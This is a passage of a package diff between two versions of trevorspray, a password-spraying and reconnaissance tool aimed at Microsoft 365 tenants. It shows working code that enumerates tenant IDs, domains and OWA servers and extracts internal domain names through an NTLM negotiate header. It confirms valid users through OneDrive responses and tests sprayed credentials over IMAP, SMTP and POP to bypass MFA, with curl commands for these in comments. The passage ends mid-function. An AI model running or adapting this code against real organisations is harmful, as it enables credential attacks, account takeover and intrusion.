         self.tenantnames = []
 
-
     def recon(self):
-
         self.printjson(self.mxrecords())
         self.printjson(self.txtrecords())
 
         openid_configuration = self.openid_configuration()
         self.printjson(openid_configuration)
-        authorization_endpoint = openid_configuration.get('authorization_endpoint', '')
-        uuid_regex = re.compile(r'[0-9a-f]{8}\b-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-\b[0-9a-f]{12}')
+        authorization_endpoint = openid_configuration.get("authorization_endpoint", "")
+        uuid_regex = re.compile(
+            r"[0-9a-f]{8}\b-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-\b[0-9a-f]{12}"
+        )
         matches = uuid_regex.findall(authorization_endpoint)
         if matches:
             log.success(f'Tenant ID: "{matches[0]}"')
 
         self.printjson(self.getuserrealm())
         self.printjson(self.autodiscover())
         self.owa()
 
         msoldomains = self.msoldomains()
         if msoldomains:
             self.printjson(msoldomains)
-            loot_dir = self.trevor.home / 'loot'
-            loot_file = loot_dir / f'recon_{self.domain}_other_tenant_domains.txt'
+            loot_dir = self.trevor.home / "loot"
+            loot_file = loot_dir / f"recon_{self.domain}_other_tenant_domains.txt"
             update_file(loot_file, msoldomains)
-            log.info(f'Wrote {len(msoldomains):,} domains to {loot_file}')
+            log.info(f"Wrote {len(msoldomains):,} domains to {loot_file}")
         self.onedrive_tenantnames()
 
-
     @staticmethod
     def printjson(j):
-
         if j:
-            log.success(f'\n{highlight_json(j)}')
+            log.success(f"\n{highlight_json(j)}")
         else:
-            log.warn('No results.')
+            log.warn("No results.")
 
     def openid_configuration(self):
-
         if self._openid_configuration is None:
-            url = f'https://login.windows.net/{self.domain}/.well-known/openid-configuration'
-            log.info(f'Checking OpenID configuration at {url}')
+            url = f"https://login.windows.net/{self.domain}/.well-known/openid-configuration"
+            log.info(f"Checking OpenID configuration at {url}")
             log.info(f'NOTE: You can spray against "token_endpoint" with --url!!')
 
             content = dict()
             with suppress(Exception):
                 content = request(url=url).json()
             self._openid_configuration = content
 
         return self._openid_configuration
 
-
     def getuserrealm(self):
-
         if self._userrealm is None:
-            url = f'https://login.microsoftonline.com/getuserrealm.srf?login=test@{self.domain}'
-            log.info(f'Checking user realm at {url}')
+            url = f"https://login.microsoftonline.com/getuserrealm.srf?login=test@{self.domain}"
+            log.info(f"Checking user realm at {url}")
 
             content = dict()
             with suppress(Exception):
                 content = request(url=url).json()
             self._userrealm = content
 
         return self._userrealm
 
-
     def mxrecords(self):
-        
         if self._mxrecords is None:
-            log.info(f'Checking MX records for {self.domain}')
+            log.info(f"Checking MX records for {self.domain}")
             mx_records = []
             with suppress(Exception):
-                for x in dns.resolver.query(self.domain, 'MX'):
+                for x in dns.resolver.query(self.domain, "MX"):
                     mx_records.append(x.to_text())
             self._mxrecords = mx_records
 
         return self._mxrecords
 
-
     def txtrecords(self):
-
         if self._txtrecords is None:
-            log.info(f'Checking TXT records for {self.domain}')
+            log.info(f"Checking TXT records for {self.domain}")
             txt_records = []
             with suppress(Exception):
-                for x in dns.resolver.query(self.domain, 'TXT'):
+                for x in dns.resolver.query(self.domain, "TXT"):
                     txt_records.append(x.to_text())
             self._txtrecords = txt_records
 
         return self._txtrecords
 
-
     def autodiscover(self):
-
         if self._autodiscover is None:
-            url = f'https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/test@{self.domain}?Protocol=Autodiscoverv1'
-            log.info(f'Checking autodiscover info at {url}')
+            url = f"https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/test@{self.domain}?Protocol=Autodiscoverv1"
+            log.info(f"Checking autodiscover info at {url}")
 
             content = dict()
             with suppress(Exception):
-                content = request(
-                    url=url,
-                    retries=0
-                ).json()
+                content = request(url=url, retries=0).json()
             self._autodiscover = content
 
         return self._autodiscover
 
-
     def msoldomains(self):
-
         if self._msoldomains is None:
+            url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"
 
-            url = 'https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc'
-
-            data = f'''<?xml version="1.0" encoding="utf-8"?>
+            data = f"""<?xml version="1.0" encoding="utf-8"?>
     <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
         <soap:Header>
             <a:Action soap:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation</a:Action>
             <a:To soap:mustUnderstand="1">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc</a:To>
             <a:ReplyTo>
                 <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
             </a:ReplyTo>
@@ -161,199 +143,192 @@
         <soap:Body>
             <GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
                 <Request>
                     <Domain>{self.domain}</Domain>
                 </Request>
             </GetFederationInformationRequestMessage>
         </soap:Body>
-    </soap:Envelope>'''
+    </soap:Envelope>"""
 
             headers = {
-                'Content-Type': 'text/xml; charset=utf-8',
-                'SOAPAction': '"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"',
-                'User-Agent': 'AutodiscoverClient',
-                'Accept-Encoding': 'identity'
+                "Content-Type": "text/xml; charset=utf-8",
+                "SOAPAction": '"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"',
+                "User-Agent": "AutodiscoverClient",
+                "Accept-Encoding": "identity",
             }
 
-            log.info(f'Retrieving tenant domains at {url}')
+            log.info(f"Retrieving tenant domains at {url}")
 
-            response = request(
-                'POST',
-                url,
-                headers=headers,
-                data=data
-            )
+            response = request("POST", url, headers=headers, data=data)
 
-            r = re.compile(r'<Domain>([^<>/]*)</Domain>', re.I)
+            r = re.compile(r"<Domain>([^<>/]*)</Domain>", re.I)
             domains = list(set(r.findall(response.text)))
 
             for domain in domains:
                 # Check if this is "the initial" domain (tenantname)
-                if domain.lower().endswith('.onmicrosoft.com'):
-                    self.tenantnames.append(domain.split('.')[0])
+                if domain.lower().endswith(".onmicrosoft.com"):
+                    self.tenantnames.append(domain.split(".")[0])
 
             if self.tenantnames:
                 log.success(f'Found tenant names: "{", ".join(self.tenantnames)}"')
 
             if domains:
-                log.success(f'Found {len(domains):,} domains under tenant!')
+                log.success(f"Found {len(domains):,} domains under tenant!")
 
             self._msoldomains = domains
 
         return self._msoldomains
 
-
     def onedrive_tenantnames(self):
-
         if self._onedrive_tenantnames is None:
-
             self.msoldomains()
 
             if not self.tenantnames:
                 return []
 
             self._onedrive_tenantnames = []
 
-            log.info(f'Checking OneDrive instances')
-
-            tenantname_override = self.trevor.runtimeparams.get('tenantname', '')
-            for tenantname in ([tenantname_override] if tenantname_override else self.tenantnames):
+            log.info(f"Checking OneDrive instances")
 
+            tenantname_override = self.trevor.runtimeparams.get("tenantname", "")
+            for tenantname in (
+                [tenantname_override] if tenantname_override else self.tenantnames
+            ):
                 url = f'https://{tenantname}-my.sharepoint.com/personal/TESTUSER_{"_".join(self.domain.split("."))}/_layouts/15/onedrive.aspx'
 
                 status_code = 0
                 with suppress(Exception):
-                    status_code = request(
-                        url=url,
-                        method='HEAD',
-                        retries=0
-                    ).status_code
+                    status_code = request(url=url, method="HEAD", retries=0).status_code
 
                 if status_code:
                     log.success(f'Tenant "{tenantname}" confirmed via OneDrive: {url}')
                     self._onedrive_tenantnames.append(tenantname)
                 else:
-                    log.warning(f'Hosted OneDrive instance for "{tenantname}" does not exist')
+                    log.warning(
+                        f'Hosted OneDrive instance for "{tenantname}" does not exist'
+                    )
             self._onedrive_tenantnames = list(set(self._onedrive_tenantnames))
 
         return self._onedrive_tenantnames
 
-
     def owa(self):
-
         if self._owa is None:
-
-            log.info('Attempting to discover OWA instances')
+            log.info("Attempting to discover OWA instances")
 
             owas = set()
 
-            schemes = [
-                'http://',
-                'https://'
-            ]
+            schemes = ["http://", "https://"]
 
             urls = [
-                f'autodiscover.{self.domain}/autodiscover/autodiscover.xml',
-                f'exchange.{self.domain}/autodiscover/autodiscover.xml',
-                f'webmail.{self.domain}/autodiscover/autodiscover.xml',
-                f'email.{self.domain}/autodiscover/autodiscover.xml',
-                f'mail.{self.domain}/autodiscover/autodiscover.xml',
-                f'owa.{self.domain}/autodiscover/autodiscover.xml',
-                f'mx.{self.domain}/autodiscover/autodiscover.xml',
-                f'{self.domain}/autodiscover/autodiscover.xml',
+                f"autodiscover.{self.domain}/autodiscover/autodiscover.xml",
+                f"exchange.{self.domain}/autodiscover/autodiscover.xml",
+                f"webmail.{self.domain}/autodiscover/autodiscover.xml",
+                f"email.{self.domain}/autodiscover/autodiscover.xml",
+                f"mail.{self.domain}/autodiscover/autodiscover.xml",
+                f"owa.{self.domain}/autodiscover/autodiscover.xml",
+                f"mx.{self.domain}/autodiscover/autodiscover.xml",
+                f"{self.domain}/autodiscover/autodiscover.xml",
+            ]
+            urls += [
+                f'{mx.split()[-1].strip(".")}/autodiscover/autodiscover.xml'
+                for mx in self.mxrecords()
             ]
-            urls += [f'{mx.split()[-1].strip(".")}/autodiscover/autodiscover.xml' for mx in self.mxrecords()]
             if self.trevor.options.url:
                 parsed_url = urlparse(self.trevor.options.url)
-                base_url = urlunparse(parsed_url._replace(query='', path=''))
-                urls += [f'{base_url}/autodiscover/autodiscover.xml']
+                base_url = urlunparse(parsed_url._replace(query="", path=""))
+                urls += [f"{base_url}/autodiscover/autodiscover.xml"]
             urls = list(set(urls))
 
-            headers = {
-                'Content-Type': 'text/xml'
-            }
+            headers = {"Content-Type": "text/xml"}
 
             with ThreadPool(maxthreads=10) as pool:
                 pool.start()
                 for scheme in schemes:
                     for u in urls:
-                        url = f'{scheme}{u}'
-                        pool.submit(
-                            request,
-                            url=url,
-                            headers=headers,
-                            retries=0
-                        )
+                        url = f"{scheme}{u}"
+                        pool.submit(request, url=url, headers=headers, retries=0)
                 for r in pool.results(wait=True):
-                    response_headers = {k.lower(): v for k,v in getattr(r, 'headers', {}).items()}
-                    if r is not None and type(r) != str and ('x-owa-version' in response_headers or 'NTLM' in response_headers.get('www-authenticate', '')):
-                        log.success(f'Found OWA at {r.request.url}')
-                        pool.submit(
-                            self.owa_internal_domain,
-                            url=r.request.url
+                    response_headers = {
+                        k.lower(): v for k, v in getattr(r, "headers", {}).items()
+                    }
+                    if (
+                        r is not None
+                        and type(r) != str
+                        and (
+                            "x-owa-version" in response_headers
+                            or "NTLM" in response_headers.get("www-authenticate", "")
                         )
+                    ):
+                        log.success(f"Found OWA at {r.request.url}")
+                        pool.submit(self.owa_internal_domain, url=r.request.url)
                         owas.add(r.request.url)
-    
+
             self._owa = list(owas)
 
         return self._owa
 
-
     def owa_internal_domain(self, url=None):
-        '''
+        """
         Stolen from:
             - https://github.com/dafthack/MailSniper
             - https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/owa_login.rb
-        '''
+        """
 
         if url is None:
-            url = f'https://{self.trevor.domain}/autodiscover/autodiscover.xml'
+            url = f"https://{self.trevor.domain}/autodiscover/autodiscover.xml"
 
-        log.debug(f'Trying to extract internal domain via NTLM from {url}')
+        log.debug(f"Trying to extract internal domain via NTLM from {url}")
 
         juicy_endpoints = [
-            'aspnet_client',
-            'autodiscover',
-            'autodiscover/autodiscover.xml',
-            'ecp',
-            'ews',
-            'ews/exchange.asmx',
-            'ews/services.wsdl',
-            'exchange',
-            'microsoft-server-activesync',
-            'microsoft-server-activesync/default.eas',
-            'oab',
-            'owa',
-            'powershell',
-            'rpc',
+            "aspnet_client",
+            "autodiscover",
+            "autodiscover/autodiscover.xml",
+            "ecp",
+            "ews",
+            "ews/exchange.asmx",
+            "ews/services.wsdl",
+            "exchange",
+            "microsoft-server-activesync",
+            "microsoft-server-activesync/default.eas",
+            "oab",
+            "owa",
+            "powershell",
+            "rpc",
         ]
 
-        urls = {url,}
+        urls = {
+            url,
+        }
         parsed_url = urlparse(url)
-        base_url = urlunparse(parsed_url._replace(query='', path=''))
+        base_url = urlunparse(parsed_url._replace(query="", path=""))
         for endpoint in juicy_endpoints:
-            urls.add(f'{base_url}/{endpoint}'.lower())
+            urls.add(f"{base_url}/{endpoint}".lower())
 
-        netbios_domain = ''
+        netbios_domain = ""
         for url in urls:
             r = request(
-                'POST',
+                "POST",
                 url,
                 headers={
-                    'Authorization': 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='
+                    "Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
                 },
-                timeout=3
+                timeout=3,
             )
             ntlm_info = {}
-            www_auth = getattr(r, 'headers', {}).get('WWW-Authenticate', '')
+            www_auth = getattr(r, "headers", {}).get("WWW-Authenticate", "")
             if www_auth:
                 try:
                     ntlm_info = ntlmdecode(www_auth)
                 except Exception as e:
-                    log.debug(f'Failed to extract NTLM domain: {e}')
+                    log.debug(f"Failed to extract NTLM domain: {e}")
             if ntlm_info:
-                netbios_domain = ntlm_info.get('DNS_Domain_name', ntlm_info.get('DNS_Tree_Name', ntlm_info.get('NetBIOS_Domain_Name', '')))
+                netbios_domain = ntlm_info.get(
+                    "DNS_Domain_name",
+                    ntlm_info.get(
+                        "DNS_Tree_Name", ntlm_info.get("NetBIOS_Domain_Name", "")
+                    ),
+                )
                 log.success(f'Found internal domain via NTLM: "{netbios_domain}"')
-                ntlm_info.pop('Timestamp', '')
+                ntlm_info.pop("Timestamp", "")
                 self.printjson(ntlm_info)
                 break
-        return netbios_domain
+        return netbios_domain
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/enumerators/__init__.py` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__init__.py`

 * *Files 11% similar despite different names*

```diff
@@ -1,24 +1,28 @@
 import os
 import importlib
 from pathlib import Path
-from ..sprayers.base import BaseSprayModule
+from .base import BaseSprayModule
 
 module_dir = Path(__file__).parent
 module_files = list(os.listdir(module_dir))
 module_choices = {}
 
 for file in module_files:
-
     file = module_dir / file
 
-    if file.is_file() and file.suffix.lower() == '.py' and file.stem not in ['base', '__init__']:
-
-        modules = importlib.import_module(f'lib.enumerators.{file.stem}', 'trevorspray')
+    if (
+        file.is_file()
+        and file.suffix.lower() == ".py"
+        and file.stem not in ["base", "__init__"]
+    ):
+        modules = importlib.import_module(
+            f"trevorspray.lib.sprayers.{file.stem}", "trevorspray"
+        )
 
         for m in modules.__dict__.keys():
             module = getattr(modules, m)
             try:
                 if BaseSprayModule in module.__bases__:
                     module_choices[file.stem] = module
             except AttributeError:
-                continue
+                continue
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/__init__.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/__init__.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/__init__.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/__init__.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/onedrive.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/enumerators/__pycache__/seamless_sso.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/enumerators/onedrive.py` & `trevorspray-2.0.8/trevorspray/lib/enumerators/onedrive.py`

 * *Files 17% similar despite different names*

```diff
@@ -1,67 +1,72 @@
 import logging
 from ..util import request
 from ..sprayers.base import BaseSprayModule
 
-log = logging.getLogger('trevorspray.enumerators.onedrive')
+log = logging.getLogger("trevorspray.enumerators.onedrive")
 
-class OneDriveUserEnum(BaseSprayModule):
 
+class OneDriveUserEnum(BaseSprayModule):
     # HTTP method
-    method = 'GET'
+    method = "GET"
     # default target URL
-    default_url = 'https://{tenantname}-my.sharepoint.com/personal/{username}_{domain}/_layouts/15/onedrive.aspx'
+    default_url = "https://{tenantname}-my.sharepoint.com/personal/{username}_{domain}/_layouts/15/onedrive.aspx"
     # How many times to retry HTTP requests
     retries = 0
 
     def initialize(self):
-
         # determine domain
-        self.domain = self.trevor.runtimeparams.get('domain', '')
+        self.domain = self.trevor.runtimeparams.get("domain", "")
         if not self.domain:
             self.domain = str(self.trevor.domain)
             if not self.domain:
-                log.error('Failed to determine domain. Please set the environment variable: TREVOR_domain=<domain>')
+                log.error(
+                    "Failed to determine domain. Please set the environment variable: TREVOR_domain=<domain>"
+                )
                 return False
-            log.info(f'Using domain "{self.domain}" (export TREVOR_domain=<domain> to override)')
+            log.info(
+                f'Using domain "{self.domain}" (export TREVOR_domain=<domain> to override)'
+            )
 
         # determine tenant name
         self.discovery = self.trevor.discovery(self.domain)
-        self.tenantname = self.trevor.env.get('tenantname', '')
+        self.tenantname = self.trevor.env.get("tenantname", "")
         if not self.tenantname:
             if self.discovery.onedrive_tenantnames():
                 self.tenantname = self.discovery.onedrive_tenantnames()[0]
-                log.info(f'Using tenantname "{self.tenantname}" (export TREVOR_tenantname=<tenantname> to override)')
+                log.info(
+                    f'Using tenantname "{self.tenantname}" (export TREVOR_tenantname=<tenantname> to override)'
+                )
             else:
-                log.error('Failed to confirm tenant name via OneDrive. To force, set the environment variable: TREVOR_tenantname=<tenantname>')
+                log.error(
+                    "Failed to confirm tenant name via OneDrive. To force, set the environment variable: TREVOR_tenantname=<tenantname>"
+                )
                 return False
 
-        self.globalparams.update({
-            'domain': self.domain.replace('.', '_').replace('-', '_'),
-            'tenantname': self.tenantname,
-        })
+        self.globalparams.update(
+            {
+                "domain": self.domain.replace(".", "_").replace("-", "_"),
+                "tenantname": self.tenantname,
+            }
+        )
 
         return True
 
-
     def create_params(self, username, password):
-
-        user = str(username).split('@')[0].replace('.', '_').replace('-', '_')
+        user = str(username).split("@")[0].replace(".", "_").replace("-", "_")
         return {
-            'username': user,
+            "username": user,
         }
 
-
     def check_response(self, response):
-
         valid = None
         exists = False
         locked = None
 
-        status_code = getattr(response, 'status_code', 0)
+        status_code = getattr(response, "status_code", 0)
         msg = f'Response code "{status_code}"'
 
         if response.status_code in [200, 401, 403, 302]:
             msg = f'Confirmed valid user via OneDrive! (Response code "{status_code}")'
             exists = True
 
         return (valid, exists, locked, msg)
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/logger.py` & `trevorspray-2.0.8/trevorspray/lib/logger.py`

 * *Files 6% similar despite different names*

```diff
@@ -5,72 +5,67 @@
 from copy import copy
 from pathlib import Path
 
 ### PRETTY COLORS ###
 
 
 class ColoredFormatter(logging.Formatter):
-
     color_mapping = {
-        'DEBUG':    242, # grey
-        'VERBOSE':  242, # grey
-        'INFO':     69,  # blue
-        'SUCCESS':  118, # green
-        'WARNING':  208, # orange
-        'ERROR':    196, # red
-        'CRITICAL': 196, # red
+        "DEBUG": 242,  # grey
+        "VERBOSE": 242,  # grey
+        "INFO": 69,  # blue
+        "SUCCESS": 118,  # green
+        "WARNING": 208,  # orange
+        "ERROR": 196,  # red
+        "CRITICAL": 196,  # red
     }
 
     char_mapping = {
-        'DEBUG':    'DBUG',
-        'VERBOSE':  'VERB',
-        'INFO':     'INFO',
-        'SUCCESS':  'SUCC',
-        'WARNING':  'WARN',
-        'ERROR':    'ERRR',
-        'CRITICAL': 'CRIT',
+        "DEBUG": "DBUG",
+        "VERBOSE": "VERB",
+        "INFO": "INFO",
+        "SUCCESS": "SUCC",
+        "WARNING": "WARN",
+        "ERROR": "ERRR",
+        "CRITICAL": "CRIT",
     }
 
-    prefix = '\033[1;38;5;'
-    suffix = '\033[0m'
+    prefix = "\033[1;38;5;"
+    suffix = "\033[0m"
 
     def __init__(self, pattern):
-
         super().__init__(pattern)
 
-
     def format(self, record):
-
         colored_record = copy(record)
         levelname = colored_record.levelname
-        levelchar = self.char_mapping.get(levelname, 'INFO')
-        seq = self.color_mapping.get(levelname, 15) # default white
-        colored_levelname = f'{self.prefix}{seq}m[{levelchar}]{self.suffix}'
-        if levelname == 'CRITICAL':
-            colored_record.msg = f'{self.prefix}{seq}m{colored_record.msg}{self.suffix}'
+        levelchar = self.char_mapping.get(levelname, "INFO")
+        seq = self.color_mapping.get(levelname, 15)  # default white
+        colored_levelname = f"{self.prefix}{seq}m[{levelchar}]{self.suffix}"
+        if levelname == "CRITICAL":
+            colored_record.msg = f"{self.prefix}{seq}m{colored_record.msg}{self.suffix}"
         colored_record.levelname = colored_levelname
 
         return logging.Formatter.format(self, colored_record)
 
 
-
 def addLoggingLevel(levelName, levelNum, methodName=None):
     """
     Comprehensively adds a new logging level to the `logging` module and the
     currently configured logging class.
 
     `levelName` becomes an attribute of the `logging` module with the value
     `levelNum`. `methodName` becomes a convenience method for both `logging`
     itself and the class returned by `logging.getLoggerClass()` (usually just
     `logging.Logger`). If `methodName` is not specified, `levelName.lower()` is
     used.
 
     To avoid accidental clobberings of existing attributes, this method will
     raise an `AttributeError` if the level name is already an attribute of the
-    `logging` module or if the method name is already present 
+    `logging` module or if the method name is already present
 
     Example
     -------
     >>> addLoggingLevel('TRACE', logging.DEBUG - 5)
     >>> logging.getLogger(__name__).setLevel("TRACE")
     >>> logging.getLogger(__name__).trace('that worked')
     >>> logging.trace('so did this')
@@ -78,56 +73,57 @@
     5
 
     """
     if not methodName:
         methodName = levelName.lower()
 
     if hasattr(logging, levelName):
-       raise AttributeError('{} already defined in logging module'.format(levelName))
+        raise AttributeError("{} already defined in logging module".format(levelName))
     if hasattr(logging, methodName):
-       raise AttributeError('{} already defined in logging module'.format(methodName))
+        raise AttributeError("{} already defined in logging module".format(methodName))
     if hasattr(logging.getLoggerClass(), methodName):
-       raise AttributeError('{} already defined in logger class'.format(methodName))
+        raise AttributeError("{} already defined in logger class".format(methodName))
 
     # This method was inspired by the answers to Stack Overflow post
     # http://stackoverflow.com/q/2183233/2988730, especially
     # http://stackoverflow.com/a/13638084/2988730
     def logForLevel(self, message, *args, **kwargs):
         if self.isEnabledFor(levelNum):
             self._log(levelNum, message, args, **kwargs)
+
     def logToRoot(message, *args, **kwargs):
         logging.log(levelNum, message, *args, **kwargs)
 
     logging.addLevelName(levelNum, levelName)
     setattr(logging, levelName, levelNum)
     setattr(logging.getLoggerClass(), methodName, logForLevel)
     setattr(logging, methodName, logToRoot)
 
 
 # custom logging levels
-addLoggingLevel('SUCCESS', 25)
-addLoggingLevel('VERBOSE', 15)
+addLoggingLevel("SUCCESS", 25)
+addLoggingLevel("VERBOSE", 15)
 
 
 ### LOG TO STDOUT AND FILE ###
 
-log_dir = Path.home() / '.trevorspray'
-log_file = log_dir / 'trevorspray.log'
+log_dir = Path.home() / ".trevorspray"
+log_file = log_dir / "trevorspray.log"
 log_dir.mkdir(exist_ok=True)
 
 console_handler = logging.StreamHandler(sys.stdout)
-if any([x.lower() in ['--debug', '--verbose', '-v'] for x in sys.argv]):
+if any([x.lower() in ["--debug", "--verbose", "-v"] for x in sys.argv]):
     console_handler.addFilter(lambda x: x.levelno >= logging.DEBUG)
 else:
     console_handler.addFilter(lambda x: x.levelno >= logging.VERBOSE)
-console_handler.setFormatter(ColoredFormatter('%(levelname)s %(message)s'))
+console_handler.setFormatter(ColoredFormatter("%(levelname)s %(message)s"))
 file_handler = logging.FileHandler(str(log_file))
 file_handler.addFilter(lambda x: x.levelno >= logging.DEBUG)
-file_handler.setFormatter(logging.Formatter('%(asctime)s %(levelname)s %(message)s'))
+file_handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
 
-root_logger = logging.getLogger('trevorspray')
+root_logger = logging.getLogger("trevorspray")
 root_logger.handlers = [console_handler, file_handler]
 root_logger.setLevel(logging.DEBUG)
 
-proxy_logger = logging.getLogger('trevorproxy')
+proxy_logger = logging.getLogger("trevorproxy")
 proxy_logger.handlers = [console_handler, file_handler]
-proxy_logger.setLevel(logging.DEBUG)
+proxy_logger.setLevel(logging.DEBUG)
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/looters/__pycache__/base.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/base.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/looters/__pycache__/base.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/base.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/looters/__pycache__/msol.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/msol.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/looters/__pycache__/msol.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/looters/__pycache__/msol.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/looters/base.py` & `trevorspray-2.0.8/trevorspray/lib/looters/base.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,18 +1,20 @@
 import logging
 
-log = logging.getLogger('trevorspray.looters.base')
+log = logging.getLogger("trevorspray.looters.base")
 
-class Looter:
 
+class Looter:
     def __init__(self, sprayer, credential):
-
         self.sprayer = sprayer
         self.credential = credential
         self.loot_dir = self.sprayer.trevor.loot_dir
-        self.looters = [getattr(self, func) for func in dir(self) if callable(getattr(self, func)) and func.startswith("looter_")]
-
+        self.looters = [
+            getattr(self, func)
+            for func in dir(self)
+            if callable(getattr(self, func)) and func.startswith("looter_")
+        ]
 
     def run(self):
-        log.info(f'Running loot module: {self.__class__.__name__}')
+        log.info(f"Running loot module: {self.__class__.__name__}")
         for func in self.looters:
-            func()
+            func()
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/looters/msol.py` & `trevorspray-2.0.8/trevorspray/lib/looters/msol.py`

 * *Files 14% similar despite different names*

```diff
@@ -3,390 +3,408 @@
 import requests
 from ..util import *
 from .base import Looter
 from contextlib import suppress
 from requests.auth import HTTPBasicAuth
 
 
-log = logging.getLogger('trevorspray.looters.msol')
+log = logging.getLogger("trevorspray.looters.msol")
 
 
 class MSOLLooter(Looter):
-
     def looter_legacy_auth(self):
-
         self.test_imap(*self.credential)
         self.test_smtp(*self.credential)
         self.test_pop(*self.credential)
         self.test_ews(*self.credential)
         self.test_eas(*self.credential)
         self.test_exo_pwsh(*self.credential)
         self.test_autodiscover(*self.credential)
         self.test_azure_management(*self.credential)
         self.test_um(*self.credential)
 
-
     def test_imap(self, username, password):
-
-        log.info(f'Testing IMAP4 MFA bypass for {username}')
+        log.info(f"Testing IMAP4 MFA bypass for {username}")
         from imaplib import IMAP4, IMAP4_SSL
+
         success = False
 
         # curl -v "imaps://outlook.office365.com:993/INBOX" --user "username:password"
         try:
-            session = IMAP4_SSL('outlook.office365.com', 993)
+            session = IMAP4_SSL("outlook.office365.com", 993)
             log.debug(session.welcome.decode())
             response = session.login(username, password)
-            log.success(f'MFA bypass (IMAP) enabled for {username}!')
+            log.success(f"MFA bypass (IMAP) enabled for {username}!")
             success = True
 
         except IMAP4.error as e:
-            log.warning(f'IMAP MFA bypass failed for {username}: {e}')
+            log.warning(f"IMAP MFA bypass failed for {username}: {e}")
 
         except Exception as e:
             if log.level <= logging.DEBUG:
                 import traceback
+
                 log.error(traceback.format_exc())
             else:
-                log.error(f'Unknown error while testing IMAP for {username}: {e}')
+                log.error(f"Unknown error while testing IMAP for {username}: {e}")
 
         return success
 
-
     def test_smtp(self, username, password):
-
-        log.info(f'Testing SMTP MFA bypass for {username}')
+        log.info(f"Testing SMTP MFA bypass for {username}")
         import smtplib
+
         success = False
 
         # curl -v "smtp://outlook.office365.com:587/INBOX" --user "user:password" --ssl
         # curl -v "smtp://smtp.office365.com:587/INBOX" --user "user:password" --ssl
-        hosts = ['outlook.office365.com:587', 'smtp.office365.com:587']
+        hosts = ["outlook.office365.com:587", "smtp.office365.com:587"]
         for host in hosts:
             try:
                 session = smtplib.SMTP(host)
                 log.debug(session.starttls())
                 response = session.login(username, password)
-                log.success(f'MFA bypass (SMTP) enabled for {username}!')
+                log.success(f"MFA bypass (SMTP) enabled for {username}!")
                 success = True
                 break
 
             except smtplib.SMTPException as e:
-                log.warning(f'SMTP MFA bypass failed for {username}: {e}')
+                log.warning(f"SMTP MFA bypass failed for {username}: {e}")
 
             except Exception as e:
                 if log.level <= logging.DEBUG:
                     import traceback
+
                     log.error(traceback.format_exc())
                 else:
-                    log.error(f'Unknown error while testing SMTP for {username}: {e}')
+                    log.error(f"Unknown error while testing SMTP for {username}: {e}")
 
         return success
 
     def test_pop(self, username, password):
-
-        log.info(f'Testing POP3 MFA bypass for {username}')
+        log.info(f"Testing POP3 MFA bypass for {username}")
         import poplib
+
         success = False
 
         # curl -v "pop3s://outlook.office365.com:995/INBOX" --user "user:password"
         try:
-            session = poplib.POP3_SSL('outlook.office365.com')
